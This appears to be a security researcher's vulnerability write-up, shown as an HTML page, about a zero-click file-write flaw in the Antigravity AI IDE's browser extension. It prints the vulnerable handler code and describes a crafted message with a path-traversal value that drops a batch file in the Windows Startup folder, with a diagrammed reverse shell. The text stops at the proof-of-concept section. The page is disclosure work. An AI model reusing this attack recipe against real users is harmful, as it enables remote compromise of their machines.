<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zero-Click RCE in Google DeepMind's Antigravity</title>
    <meta name="description" content="Any website you visit could silently write files anywhere on your system. A critical vulnerability analysis.">
    <meta name="author" content="Security Research">
    <meta property="og:title" content="Zero-Click RCE in Google DeepMind's Antigravity">
    <meta property="og:description" content="Any website you visit could silently write files anywhere on your system.">
    <meta property="og:type" content="article">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/panzoom@9.4.3/dist/panzoom.min.js"></script>
    <script>
        // Theme-aware Mermaid configuration
        function getMermaidTheme() {
            const isDark = document.documentElement.getAttribute('data-theme') !== 'light';
            return {
                theme: 'base',
                themeVariables: isDark ? {
                    // Dark theme colors
                    primaryColor: '#238636',
                    primaryTextColor: '#e6edf3',
                    primaryBorderColor: '#3fb950',
                    lineColor: '#8b949e',
                    secondaryColor: '#21262d',
                    tertiaryColor: '#161b22',
                    background: '#0d1117',
                    mainBkg: '#21262d',
                    nodeBorder: '#3fb950',
                    clusterBkg: '#161b22',
                    clusterBorder: '#30363d',
                    titleColor: '#e6edf3',
                    edgeLabelBackground: '#21262d',
                    nodeTextColor: '#e6edf3',
                    actorTextColor: '#e6edf3',
                    actorBkg: '#21262d',
                    actorBorder: '#3fb950',
                    signalColor: '#e6edf3',
                    signalTextColor: '#e6edf3',
                    labelBoxBkgColor: '#21262d',
                    labelBoxBorderColor: '#30363d',
                    labelTextColor: '#e6edf3',
                    loopTextColor: '#e6edf3',
                    noteBkgColor: '#161b22',
                    noteTextColor: '#e6edf3',
                    noteBorderColor: '#58a6ff',
                    activationBkgColor: '#21262d',
                    activationBorderColor: '#3fb950',
                    sequenceNumberColor: '#0d1117',
                    sectionBkgColor: '#21262d',
                    altSectionBkgColor: '#161b22',
                    sectionBkgColor2: '#21262d',
                    taskBkgColor: '#238636',
                    taskTextColor: '#e6edf3',
                    taskTextLightColor: '#e6edf3',
                    taskBorderColor: '#3fb950',
                    gridColor: '#30363d',
                    doneTaskBkgColor: '#238636',
                    doneTaskBorderColor: '#3fb950',
                    critBkgColor: '#f85149',
                    critBorderColor: '#f85149',
                    todayLineColor: '#58a6ff',
                    stateBkg: '#21262d',
                    stateBorder: '#3fb950',
                    transitionColor: '#8b949e',
                    transitionLabelColor: '#e6edf3'
                } : {
                    // Light theme colors
                    primaryColor: '#2da44e',
                    primaryTextColor: '#1f2328',
                    primaryBorderColor: '#2da44e',
                    lineColor: '#656d76',
                    secondaryColor: '#f6f8fa',
                    tertiaryColor: '#ffffff',
                    background: '#ffffff',
                    mainBkg: '#f6f8fa',
                    nodeBorder: '#2da44e',
                    clusterBkg: '#f6f8fa',
                    clusterBorder: '#d0d7de',
                    titleColor: '#1f2328',
                    edgeLabelBackground: '#f6f8fa',
                    nodeTextColor: '#1f2328',
                    actorTextColor: '#1f2328',
                    actorBkg: '#f6f8fa',
                    actorBorder: '#2da44e',
                    signalColor: '#1f2328',
                    signalTextColor: '#1f2328',
                    labelBoxBkgColor: '#f6f8fa',
                    labelBoxBorderColor: '#d0d7de',
                    labelTextColor: '#1f2328',
                    loopTextColor: '#1f2328',
                    noteBkgColor: '#fff8c5',
                    noteTextColor: '#1f2328',
                    noteBorderColor: '#d4a72c',
                    activationBkgColor: '#f6f8fa',
                    activationBorderColor: '#2da44e',
                    sequenceNumberColor: '#ffffff',
                    stateBkg: '#f6f8fa',
                    stateBorder: '#2da44e',
                    transitionColor: '#656d76',
                    transitionLabelColor: '#1f2328'
                }
            };
        }

        // Initialize Mermaid
        mermaid.initialize({
            startOnLoad: false,
            ...getMermaidTheme(),
            flowchart: {
                curve: 'basis',
                padding: 20,
                htmlLabels: true,
                useMaxWidth: false
            },
            sequence: {
                useMaxWidth: false,
                wrap: true
            },
            state: {
                useMaxWidth: false
            },
            securityLevel: 'loose',
            fontFamily: '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif'
        });

        // Render diagrams and add zoom functionality
        async function renderDiagrams() {
            const diagrams = document.querySelectorAll('.mermaid');

            for (let i = 0; i < diagrams.length; i++) {
                const diagram = diagrams[i];
                const code = diagram.textContent;
                const id = `mermaid-diagram-${i}`;

                try {
                    const { svg } = await mermaid.render(id, code);
                    diagram.innerHTML = svg;

                    // Add zoom controls wrapper
                    const container = diagram.closest('.diagram-container');
                    if (container && !container.querySelector('.diagram-controls')) {
                        // Create controls
                        const controls = document.createElement('div');
                        controls.className = 'diagram-controls';
                        controls.innerHTML = `
                            <button class="diagram-btn zoom-in" title="Zoom In">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <circle cx="11" cy="11" r="8"></circle>
                                    <path d="M21 21l-4.35-4.35M11 8v6M8 11h6"></path>
                                </svg>
                            </button>
                            <button class="diagram-btn zoom-out" title="Zoom Out">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <circle cx="11" cy="11" r="8"></circle>
                                    <path d="M21 21l-4.35-4.35M8 11h6"></path>
                                </svg>
                            </button>
                            <button class="diagram-btn zoom-reset" title="Reset">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path>
                                    <path d="M3 3v5h5"></path>
                                </svg>
                            </button>
                            <button class="diagram-btn fullscreen-btn" title="Fullscreen">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"></path>
                                </svg>
                            </button>
                        `;
                        container.insertBefore(controls, container.firstChild);

                        // Create zoom wrapper
                        const zoomWrapper = document.createElement('div');
                        zoomWrapper.className = 'diagram-zoom-wrapper';
                        diagram.parentNode.insertBefore(zoomWrapper, diagram);
                        zoomWrapper.appendChild(diagram);

                        // Initialize panzoom
                        const svgElement = diagram.querySelector('svg');
                        if (svgElement && typeof panzoom !== 'undefined') {
                            const pz = panzoom(svgElement, {
                                maxZoom: 5,
                                minZoom: 0.3,
                                initialZoom: 1,
                                bounds: false,
                                boundsPadding: 0.1,
                                smoothScroll: false
                            });

                            // Store panzoom instance
                            container.panzoomInstance = pz;

                            // Control button handlers
                            controls.querySelector('.zoom-in').addEventListener('click', () => {
                                pz.smoothZoom(svgElement.clientWidth / 2, svgElement.clientHeight / 2, 1.5);
                            });
                            controls.querySelector('.zoom-out').addEventListener('click', () => {
                                pz.smoothZoom(svgElement.clientWidth / 2, svgElement.clientHeight / 2, 0.67);
                            });
                            controls.querySelector('.zoom-reset').addEventListener('click', () => {
                                pz.moveTo(0, 0);
                                pz.zoomAbs(0, 0, 1);
                            });
                            controls.querySelector('.fullscreen-btn').addEventListener('click', () => {
                                container.classList.toggle('diagram-fullscreen');
                                if (container.classList.contains('diagram-fullscreen')) {
                                    document.body.style.overflow = 'hidden';
                                } else {
                                    document.body.style.overflow = '';
                                }
                                setTimeout(() => pz.zoomAbs(0, 0, 1), 100);
                            });
                        }
                    }
                } catch (error) {
                    console.error('Mermaid render error:', error);
                    diagram.innerHTML = `<div class="diagram-error">Error rendering diagram</div>`;
                }
            }
        }

        // Re-render diagrams on theme change
        function updateDiagramTheme() {
            const config = getMermaidTheme();
            mermaid.initialize({
                ...config,
                startOnLoad: false,
                flowchart: { curve: 'basis', padding: 20, htmlLabels: true, useMaxWidth: false },
                sequence: { useMaxWidth: false, wrap: true },
                state: { useMaxWidth: false },
                securityLevel: 'loose'
            });
            renderDiagrams();
        }

        // Initialize on DOM ready
        document.addEventListener('DOMContentLoaded', renderDiagrams);
    </script>
</head>
<body>
    <div class="progress-bar" id="progressBar"></div>

    <nav class="navbar">
        <div class="nav-content">
            <a href="#" class="logo">Security Research</a>
            <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
                <svg class="sun-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <circle cx="12" cy="12" r="5"></circle>
                    <path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"></path>
                </svg>
                <svg class="moon-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                </svg>
            </button>
        </div>
    </nav>

    <article class="article">
        <header class="article-header">
            <div class="article-meta">
                <span class="tag critical">Critical Vulnerability</span>
                <span class="tag">Zero-Click</span>
                <span class="tag">RCE</span>
                <span class="tag">CVSS 9.8</span>
            </div>
            <h1 class="article-title">Zero-Click RCE in Google DeepMind's Antigravity</h1>
            <p class="article-subtitle">Any website you visit could silently write files anywhere on your system.</p>
            <div class="article-info">
                <time datetime="2025-11-27">November 27, 2025</time>
            </div>
        </header>

        <aside class="toc-container">
            <div class="toc" id="toc">
                <h3>Table of Contents</h3>
                <nav id="tocNav"></nav>
            </div>
        </aside>

        <div class="article-content">
            <section id="introduction">
                <h2>Introduction</h2>
                <p>AI assistants are evolving beyond simple chatbots. The new generation can see your screen, click buttons, fill forms, and interact with your browser in ways that blur the line between software and user.</p>
                <p>Google DeepMind's Antigravity is one such tool. It's an AI browser assistant that doesn't just answer questionsâ€”it takes action. And with that power comes an expanded attack surface that most security models haven't caught up with.</p>
                <p>While analyzing Antigravity's browser extension, I discovered a critical vulnerability that allowed any website to write arbitrary files to a user's system. No clicks required. No prompts. No warnings.</p>
                <div class="callout callout-danger">
                    <strong>Impact:</strong> Visiting a malicious webpage could drop an executable into your Windows Startup folder, achieving persistent code execution on next reboot.
                </div>
            </section>

            <section id="architecture">
                <h2>Part 1: Understanding the Full Architecture</h2>
                <p>Google launched Antigravity IDE on November 18, 2025â€”a fork of VS Code with AI agents built in. The agents can write code, edit files, run terminal commands, and control a browser.</p>

                <h3>The Entry Point: The Agent's Tools</h3>
                <pre><code class="language-plaintext">Tool: browser_subagent
Start a browser subagent to perform actions in the browser with the given task
description. The subagent has access to tools for both interacting with web page
content (clicking, typing, navigating, etc) and controlling the browser window
itself (resizing, etc).

Note: All browser interactions are automatically recorded and saved as WebP
videos to the artifacts directory.</code></pre>

                <h3>Tracing the Process Tree</h3>
                <pre><code class="language-bash">$ ps aux | grep Chrome
/Applications/Google Chrome.app/Contents/MacOS/Google Chrome \
  --remote-debugging-port=9222 \
  --user-data-dir=/Users/user/.gemini/antigravity-browser-profile \
  --disable-fre --no-default-browser-check</code></pre>

                <p>Chrome with <strong>remote debugging enabled on port 9222</strong>. Following the process tree revealed:</p>
                <pre><code class="language-bash">$ ps -ef | grep language_server
/Applications/Antigravity.app/.../language_server_macos_arm \
  --extension_server_port 53410 \
  --api_server_url http://jetski-server.corp.goog \
  --csrf_token [REDACTED]</code></pre>

                <p><strong>"Jetski"</strong>â€”that was the internal codename.</p>

                <div class="table-wrapper">
                    <table>
                        <thead><tr><th>Port</th><th>Purpose</th></tr></thead>
                        <tbody>
                            <tr><td>53410</td><td>Extension Server (gRPC-Web, CSRF protected)</td></tr>
                            <tr><td>53412-53413</td><td>LSP channels for code intelligence</td></tr>
                            <tr><td>9222</td><td>Chrome DevTools Protocol</td></tr>
                        </tbody>
                    </table>
                </div>

                <h3>The Six-Layer Architecture</h3>
                <p>Through reverse engineering using <code>strings</code> and <code>grep</code> on the binary, I mapped out the complete system architecture:</p>
                <pre><code class="language-bash"># Extract strings from the language server binary
$ strings language_server_macos_arm > strings_output.txt

# Search for tool handlers
$ grep -i "cortex/handlers" strings_output.txt | head -10
third_party/jetski/cortex/handlers/browser_subagent_handler.go
third_party/jetski/cortex/handlers/browser_click_element_handler.go
third_party/jetski/cortex/handlers/browser_press_key_handler.go
...</code></pre>
                <div class="diagram-container">
                    <pre class="mermaid">
flowchart TB
    subgraph Layer1["ğŸ–¥ï¸ Layer 1: User Interface"]
        IDE["Antigravity IDE<br/>(VS Code Fork)"]
        User["User Request<br/>'Go to google.com'"]
    end
    subgraph Layer2["ğŸ§  Layer 2: AI Inference"]
        Jetski["Jetski Server<br/>(jetski-server.corp.goog)"]
        Decision["Gemini Model<br/>Tool Selection"]
    end
    subgraph Layer3["âš™ï¸ Layer 3: Language Server (Cortex)"]
        LS["language_server_macos_arm<br/>Port 53410"]
        LSFeatures["gRPC-Web Protocol<br/>CSRF Token Required"]
        Handlers["Tool Handlers<br/>browser_*, fs_*, search_*"]
    end
    subgraph Layer4["ğŸ”Œ Layer 4: MCP Server"]
        MCP["@anthropic/browser-tools-mcp<br/>HTTP Bridge"]
    end
    subgraph Layer5["ğŸ”“ Layer 5: Browser Extension"]
        SW["Service Worker<br/>(service_worker_binary.js)"]
        Offscreen["Offscreen Document<br/>(offscreen_binary.js)"]
        Vuln["âš ï¸ externally_connectable<br/>matches: all_urls"]
    end
    subgraph Layer6["ğŸŒ Layer 6: Chrome Browser"]
        Chrome["Chrome + CDP<br/>Port 9222"]
        Targets["Debug Targets<br/>/json/list"]
    end
    User --> IDE
    IDE --> Jetski
    Jetski --> Decision
    Decision --> LS
    LS --> LSFeatures
    LSFeatures --> Handlers
    Handlers --> MCP
    MCP --> SW
    SW --> Offscreen
    SW --> Vuln
    Vuln --> Chrome
    Chrome --> Targets
    style Vuln fill:#ff6b6b,color:#fff,stroke:#ff6b6b
    style Handlers fill:#58a6ff,color:#fff
    style LSFeatures fill:#3fb950,color:#fff
                    </pre>
                </div>

                <h3>Complete Communication Flow</h3>
                <div class="diagram-container">
                    <pre class="mermaid">
sequenceDiagram
    autonumber
    participant User as ğŸ‘¤ User
    participant IDE as ğŸ–¥ï¸ Antigravity IDE
    participant AI as ğŸ§  Jetski/Gemini
    participant LS as âš™ï¸ Language Server
    participant MCP as ğŸ”Œ MCP Server
    participant Ext as ğŸ”“ Extension
    participant Chrome as ğŸŒ Chrome CDP

    User->>IDE: "Go to google.com"
    Note over IDE: Parse user intent
    IDE->>AI: POST /inference<br/>{"prompt": "..."}
    Note over AI: Gemini processes<br/>selects tool
    AI->>IDE: tool_call: browser.open_url<br/>{"Url": "https://google.com"}
    IDE->>LS: gRPC-Web request<br/>+ CSRF token
    Note over LS: Cortex state:<br/>CORTEX_STEP_STATUS_RUNNING
    LS->>MCP: HTTP POST /navigate
    MCP->>Ext: chrome.runtime.sendMessage()
    Ext->>Chrome: CDP: Target.createTarget<br/>{"url": "https://google.com"}
    Chrome-->>Ext: {"targetId": "..."}
    Note over LS: State: CORTEX_STEP_STATUS_DONE
    Ext-->>IDE: Success response
    IDE-->>User: "I opened google.com"
                    </pre>
                </div>

                <h3>Cortex State Machine</h3>
                <p>The Language Server uses a state machine called "Cortex" to manage tool execution. Extracted from the binary:</p>
                <pre><code class="language-bash"># Extract Cortex states from binary
$ grep "CORTEX_STEP_STATUS" strings_output.txt
CORTEX_STEP_STATUS_UNSPECIFIED
CORTEX_STEP_STATUS_PENDING
CORTEX_STEP_STATUS_RUNNING
CORTEX_STEP_STATUS_DONE
CORTEX_STEP_STATUS_FAILED
CORTEX_STEP_STATUS_CANCELLED</code></pre>
                <div class="diagram-container">
                    <pre class="mermaid">
stateDiagram-v2
    [*] --> UNSPECIFIED: Tool call received
    UNSPECIFIED --> PENDING: Queued for execution
    PENDING --> RUNNING: Handler invoked
    RUNNING --> DONE: Success
    RUNNING --> FAILED: Error occurred
    RUNNING --> CANCELLED: User cancelled
    DONE --> [*]
    FAILED --> [*]
    CANCELLED --> [*]

    note right of RUNNING
        Tool handlers execute here:
        â€¢ browser_* handlers
        â€¢ fs_* handlers
        â€¢ terminal_* handlers
        â€¢ SaveScreenRecording âš ï¸
    end note

    note right of FAILED
        Failures logged to:
        third_party/jetski/cortex/
        handlers/*_handler.go
    end note
                    </pre>
                </div>
                <div class="callout callout-info">
                    <strong>Handler Locations:</strong> Each tool has a dedicated handler file in <code>third_party/jetski/cortex/handlers/</code>. For example, <code>browser_click_element_handler.go</code> handles click operations.
                </div>

                <h3>The Complete Tool Arsenal (27+ Tools)</h3>
                <p>Using <code>strings</code> and <code>grep</code> on the binary revealed the complete tool registry with their JSON schemas:</p>
                <pre><code class="language-bash"># Extract tool argument parsing
$ grep -A 20 "ParseToolArgs" strings_output.txt
type BrowserOpenUrlArgs struct {
    Url string `json:"Url"`
}
type BrowserClickElementArgs struct {
    Element int `json:"Element"`
}
type FsWriteFileArgs struct {
    Path    string `json:"Path"`
    Content string `json:"Content"`
}</code></pre>

                <div class="diagram-container">
                    <pre class="mermaid">
flowchart TB
    subgraph BrowserTools["ğŸŒ Browser Tools (8)"]
        direction TB
        BOU["browser.open_url<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Url: string"]
        BCE["browser.click_element<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Element: int"]
        BPK["browser.press_key<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Key: string"]
        BIN["browser.input<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Text: string"]
        BGD["browser.get_dom<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>(no args)"]
        BCS["browser.capture_screenshot<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>(no args)"]
        BEJ["browser.execute_javascript<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Code: string"]
        BSD["browser.scroll_down<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Amount: int"]
    end
    subgraph FileTools["ğŸ“ File System Tools (6)"]
        direction TB
        FSV["fs.view_file_range<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Path: string<br/>StartLine: int<br/>EndLine: int"]
        FSL["fs.list_directory<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Path: string"]
        FSW["fs.write_file<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Path: string<br/>Content: string"]
        FSM["fs.move_file<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Source: string<br/>Dest: string"]
        FSC["fs.copy_file<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Source: string<br/>Dest: string"]
        FSD["fs.delete_file<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Path: string"]
    end
    subgraph TerminalTools["âŒ¨ï¸ Terminal Tools (3)"]
        direction TB
        TRD["terminal.read<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Id: string"]
        TWR["terminal.write<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Id: string<br/>Command: string"]
        TKL["terminal.kill<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Id: string"]
    end
    subgraph SearchTools["ğŸ” Search & Web (5)"]
        direction TB
        SIF["search.in_file<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Query: string<br/>Path: string"]
        SFN["search.file_name<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Query: string"]
        WSE["web.search<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Query: string"]
        HRU["http.read_url<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Url: string"]
        MWF["mcp.web_fetch<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Url: string"]
    end
    subgraph OtherTools["ğŸ”§ Other Tools (5)"]
        direction TB
        BDR["browser.drag<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>FromElement: int<br/>ToX: int, ToY: int"]
        BSA["browser_subagent<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Task: string"]
        AUD["audio.play<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Path: string"]
        IMG["image.analyze<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Path: string"]
        CLB["clipboard.read<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>(no args)"]
    end
    style FSW fill:#ff6b6b,color:#fff
    style BEJ fill:#ffa94d,color:#000
    style TWR fill:#ffa94d,color:#000
                    </pre>
                </div>

                <div class="callout callout-info">
                    <strong>Key Finding:</strong> Tools like <code>fs.write_file</code>, <code>browser.execute_javascript</code>, and <code>terminal.write</code> are high-risk primitives that can achieve code execution when combined with the extension vulnerability.
                </div>
            </section>

            <section id="red-flag">
                <h2>Part 2: The First Red Flag</h2>
                <pre><code class="language-json">{
  "externally_connectable": {
    "matches": ["&lt;all_urls&gt;"]
  }
}</code></pre>
                <div class="callout callout-warning">
                    This means <strong>every website on the internet</strong> can send messages directly to this extension.
                </div>
            </section>

            <section id="attack-surface">
                <h2>Part 3: Mapping the Attack Surface</h2>
                <p>Analyzing the extension's message handlers revealed the complete attack surface:</p>
                <pre><code class="language-bash"># Find message handlers in the extension
$ grep -E "case|action.*:" service_worker_binary.js
case 11: // SaveScreenRecording
case 12: // rpcCall
case 13: // getCurrentTabId
case 14: // CHECK_JETSKI_CONNECTION</code></pre>

                <div class="diagram-container">
                    <pre class="mermaid">
flowchart TB
    subgraph External["ğŸŒ External Attack Surface"]
        Website["evil.com<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Any website on internet"]
        Payload["Malicious Payload<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>za: byte array<br/>filename: string<br/>L: path component"]
        API["chrome.runtime.sendMessage()<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>extensionId: 'eeijfnjm...'"]
    end
    subgraph Extension["ğŸ”“ Browser Extension (Vulnerable)"]
        Manifest["manifest.json<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>externally_connectable:<br/>matches: ['&lt;all_urls&gt;']"]
        Handler["qh Handler<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>âš ï¸ NO sender validation<br/>âš ï¸ NO origin check"]
        Router["Action Router<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Switch on action type"]
    end
    subgraph Actions["ğŸ“‹ Exposed Actions"]
        A1["rpcCall<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>cancelCascade<br/>Risk: Low"]
        A2["SaveScreenRecording<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>âš ï¸ Arbitrary file write<br/>Risk: CRITICAL"]
        A3["getCurrentTabId<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Returns tab info<br/>Risk: Low"]
        A4["CHECK_JETSKI_CONNECTION<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Leak connection status<br/>Risk: Medium"]
    end
    subgraph Backend["âš™ï¸ Backend Processing"]
        Proto["Protobuf Message<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Qg message builder<br/>Fields: za, filename, L"]
        LS["Language Server<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>Port 53410<br/>gRPC-Web endpoint"]
        FS["File System<br/>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br/>âš ï¸ No path sanitization<br/>âš ï¸ Path traversal possible"]
    end
    Website --> Payload --> API
    API --> Manifest --> Handler --> Router
    Router --> A1
    Router --> A2
    Router --> A3
    Router --> A4
    A2 --> Proto --> LS --> FS
    style A2 fill:#ff6b6b,color:#fff,stroke:#ff6b6b
    style Handler fill:#ffa94d,color:#000
    style Manifest fill:#ffa94d,color:#000
    style FS fill:#ff6b6b,color:#fff
    style Payload fill:#58a6ff,color:#fff
                    </pre>
                </div>

                <div class="table-wrapper">
                    <table>
                        <thead><tr><th>Action</th><th>Handler</th><th>Purpose</th><th>Parameters</th><th>Risk</th></tr></thead>
                        <tbody>
                            <tr><td><code>rpcCall.cancelCascade</code></td><td>case 12</td><td>Cancel running automation</td><td>None</td><td class="risk-low">Low</td></tr>
                            <tr><td><code>getCurrentTabId</code></td><td>case 13</td><td>Get active tab identifier</td><td>None</td><td class="risk-low">Low</td></tr>
                            <tr><td><code>CHECK_JETSKI_CONNECTION</code></td><td>case 14</td><td>Check Language Server status</td><td>None</td><td class="risk-medium">Info Leak</td></tr>
                            <tr><td><code>SaveScreenRecording</code></td><td>case 11</td><td>Write file to disk</td><td>za, filename, L</td><td class="risk-critical">CRITICAL</td></tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <section id="vulnerability">
                <h2>Part 4: The Vulnerability</h2>
                <p>The <code>SaveScreenRecording</code> handler accepts:</p>
                <ul>
                    <li><code>za</code> â€” File contents as a byte array</li>
                    <li><code>filename</code> â€” The name of the file</li>
                    <li><code>L</code> â€” A path component</li>
                </ul>
                <pre><code class="language-plaintext">C:\Users\{username}\.gemini\antigravity\brain\{L}\{filename}</code></pre>
                <div class="callout callout-danger">
                    <strong>Critical Issue:</strong> The handler never validates who sent the message.
                </div>

                <div class="diagram-container">
                    <pre class="mermaid">
flowchart LR
    subgraph Expected["Expected Flow"]
        E1["Offscreen Doc"] -->|"Internal"| E2["Service Worker"] -->|"Verified"| E3["Disk"]
    end
    subgraph Actual["Actual Flow"]
        A1["Any Website"] -->|"External"| A2["Service Worker"] -->|"No check!"| A3["Disk"]
    end
    style E1 fill:#3fb950,color:#fff
    style A1 fill:#ff6b6b,color:#fff
    style A2 fill:#ffa94d,color:#000
                    </pre>
                </div>

                <pre><code class="language-javascript">case 11:  // SaveScreenRecording
    // Validates message SHAPE, not ORIGIN
    if (!a || typeof a !== "object" ||
        a.action !== "SaveScreenRecording" ||
        typeof a.za !== "object" ||
        typeof a.filename !== "string" ||
        typeof a.L !== "string") {
        break;
    }
    // Build protobuf message
    B = new Qg;
    Rg(B, new Uint8Array(a.za));   // ATTACKER CONTROLLED
    cd(B, 2, a.filename);           // ATTACKER CONTROLLED
    cd(B, 3, a.L);                  // ATTACKER CONTROLLED
    return z(n, dh(B).then(...), 16);</code></pre>
            </section>

            <section id="path-traversal">
                <h2>Part 5: Path Traversal</h2>
                <div class="diagram-container">
                    <pre class="mermaid">
flowchart TB
    subgraph Normal["Intended"]
        N1["Base: brain/"] --> N2["L = 'session123'"] --> N3["Result: brain/session123/recording.webm"]
    end
    subgraph Attack["Exploited"]
        A1["Base: brain/"] --> A2["L = '../../../Desktop'"] --> A3["Result: Desktop/payload.bat"]
    end
    style A2 fill:#ff6b6b,color:#fff
    style A3 fill:#ff6b6b,color:#fff
                    </pre>
                </div>
            </section>

            <section id="code-execution">
                <h2>Part 6: Achieving Code Execution</h2>
                <div class="diagram-container">
                    <pre class="mermaid">
sequenceDiagram
    autonumber
    participant V as ğŸ‘¤ Victim
    participant B as ğŸŒ Browser
    participant W as ğŸ’€ evil.com
    participant E as ğŸ”“ Extension
    participant SW as âš™ï¸ Service Worker
    participant LS as ğŸ“¡ Language Server
    participant FS as ğŸ’¾ File System
    participant OS as ğŸ–¥ï¸ Operating System

    V->>B: Opens browser<br/>(Antigravity installed)
    Note over E: Extension loaded<br/>externally_connectable: all_urls

    V->>W: Visits evil.com
    Note over W: Page loads with<br/>embedded exploit

    rect rgb(255,107,107,0.1)
        Note over W,FS: ğŸ”´ ATTACK PHASE - Zero User Interaction
        W->>E: chrome.runtime.sendMessage()<br/>extensionId: 'eeijfnjm...'
        Note over W: Payload:<br/>action: SaveScreenRecording<br/>za: [malicious bytes]<br/>filename: WindowsUpdate.bat<br/>L: ../../../AppData/.../Startup

        E->>SW: Route to handler
        Note over SW: âš ï¸ No sender.origin check<br/>âš ï¸ No sender.tab check

        SW->>SW: Build protobuf message<br/>Qg(za, filename, L)
        SW->>LS: gRPC-Web POST<br/>/SaveScreenRecording

        Note over LS: Process request<br/>No path validation
        LS->>FS: Write file<br/>Path: brain/../../../Startup/
        Note over FS: Path traversal resolves to:<br/>C:\Users\X\Startup\WindowsUpdate.bat
        FS-->>LS: Success
    end

    LS-->>E: Response: OK
    E-->>W: Callback (ignored)
    Note over V: Victim unaware<br/>No visual indication

    rect rgb(248,81,73,0.3)
        Note over V,OS: ğŸ”´ PERSISTENCE ACHIEVED
        V->>OS: Next system login
        OS->>OS: Execute Startup folder contents
        Note over OS: WindowsUpdate.bat runs<br/>â†’ PowerShell reverse shell<br/>â†’ Full system compromise
    end
                    </pre>
                </div>

                <h3>Proof of Concept</h3>
                <div class="video-container">
                    <div class="video-wrapper">
